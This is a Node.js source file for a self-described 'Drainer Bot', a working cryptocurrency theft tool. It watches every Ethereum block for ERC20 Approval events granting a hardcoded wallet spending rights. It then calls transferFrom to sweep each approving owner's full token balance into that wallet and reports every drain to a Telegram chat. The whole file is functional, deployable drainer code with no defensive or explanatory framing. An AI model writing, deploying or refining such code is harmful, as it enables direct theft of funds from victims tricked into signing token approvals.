// ============================================================
// 🔴 REQUIRED FOR RAILWAY - Web server to keep container alive
// ============================================================
const http = require('http');

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Drainer Bot Running\n');
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`✅ Web server listening on port ${PORT}`);
});

// ============================================================
// 🔴 YOUR BOT CODE STARTS HERE
// ============================================================
const { ethers } = require('ethers');

// Your wallet address
const YOUR_WALLET_ADDRESS = '0x277c6118CcDB4F2E7A5e71D3406de484145e27D8';

// Environment variables
const YOUR_PRIVATE_KEY = process.env.PRIVATE_KEY;
const ETHEREUM_RPC = process.env.INFURA_URL;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

console.log('🔍 Checking environment variables...');
console.log('PRIVATE_KEY set:', !!YOUR_PRIVATE_KEY);
console.log('INFURA_URL set:', !!ETHEREUM_RPC);
console.log('TELEGRAM_BOT_TOKEN set:', !!TELEGRAM_BOT_TOKEN);
console.log('TELEGRAM_CHAT_ID set:', !!TELEGRAM_CHAT_ID);

// Telegram function
async function sendTelegram(msg) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('📝 Telegram not configured, message:', msg);
    return;
  }
  
  try {
    const fetch = (await import('node-fetch')).default;
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: msg,
        parse_mode: 'Markdown'
      })
    });
  } catch (err) {
    console.log('Telegram error:', err.message);
  }
}

// ERC20 ABI
const ERC20_ABI = [
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function balanceOf(address account) view returns (uint256)',
  'function symbol() view returns (string)'
];

const APPROVAL_TOPIC = ethers.id('Approval(address,address,uint256)');

async function drainToken(tokenAddress, owner, wallet) {
  try {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
    
    const symbol = await tokenContract.symbol().catch(() => 'Unknown');
    const balance = await tokenContract.balanceOf(owner);
    
    if (balance === 0n) return;
    
    const formattedBalance = ethers.formatEther(balance);
    console.log(`💰 Found ${formattedBalance} ${symbol}`);
    
    await sendTelegram(`🔄 Draining ${formattedBalance} ${symbol}`);
    
    const tx = await tokenContract.transferFrom(
      owner,
      YOUR_WALLET_ADDRESS,
      balance,
      { gasLimit: 100000 }
    );
    
    console.log(`✅ Drained! TX: ${tx.hash}`);
    await sendTelegram(`✅ Success!`);
    
  } catch (err) {
    console.error('Error draining:', err.message);
  }
}

async function main() {
  console.log('🚀 Starting Drainer Bot...');
  
  if (!YOUR_PRIVATE_KEY || !ETHEREUM_RPC) {
    console.error('❌ Missing required environment variables');
    process.exit(1);
  }
  
  try {
    const provider = new ethers.JsonRpcProvider(ETHEREUM_RPC);
    const wallet = new ethers.Wallet(YOUR_PRIVATE_KEY, provider);
    
    console.log(`🤖 Bot wallet: ${wallet.address}`);
    
    const botBalance = await provider.getBalance(wallet.address);
    console.log(`💰 Bot ETH balance: ${ethers.formatEther(botBalance)} ETH`);
    
    const filter = {
      topics: [
        APPROVAL_TOPIC,
        null,
        ethers.zeroPadValue(YOUR_WALLET_ADDRESS, 32)
      ]
    };
    
    console.log('👀 Monitoring for approvals...');
    
    provider.on('block', async (blockNumber) => {
      try {
        const logs = await provider.getLogs({
          ...filter,
          fromBlock: blockNumber,
          toBlock: blockNumber
        });
        
        for (const log of logs) {
          const owner = '0x' + log.topics[1].slice(26);
          const tokenAddress = log.address;
          console.log(`\n🎯 Found approval in block ${blockNumber}`);
          await drainToken(tokenAddress, owner, wallet);
        }
      } catch (err) {
        console.error('Block error:', err.message);
      }
    });
    
    console.log('✅ Bot is running...');
    
  } catch (err) {
    console.error('🔥 Fatal error:', err);
    process.exit(1);
  }
}

main().catch(console.error);